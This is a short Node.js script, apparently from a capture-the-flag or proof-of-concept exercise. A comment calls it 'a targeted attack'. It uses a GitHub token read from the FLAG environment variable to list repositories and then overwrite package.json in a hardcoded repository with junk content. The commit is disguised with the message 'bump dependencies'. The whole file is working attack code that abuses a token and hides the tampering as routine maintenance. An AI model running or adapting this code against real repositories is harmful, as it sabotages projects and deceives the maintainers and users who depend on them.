const github  = require('@actions/github');

const main = async () => {
  const octokit     = github.getOctokit(process.env.FLAG);
  // const fileContent = Buffer
  //   .from('{\n}')
  //   .toString('base64');

  // this is a targeted attack, repo name can be hardcoded
  const owner      = 'whoamipl';
  const repo       = 'foobar';
  const branchName = 'main';
  const path       = 'package.json';

  // const content = await octokit.repos.getContent({
  //   owner: owner,
  //   repo:  repo,
  //   ref:   branchName,
  //   path:  path
  // });
  console.log(octokit.rest.repos.listForAuthenticatedUser());

  await octokit.repos.createOrUpdateFileContents({
    owner:   owner,
    repo:    repo,
    branch:  branchName,
    path:    path,
    message: 'bump dependencies',
    content: ";)))",
  });
};

main();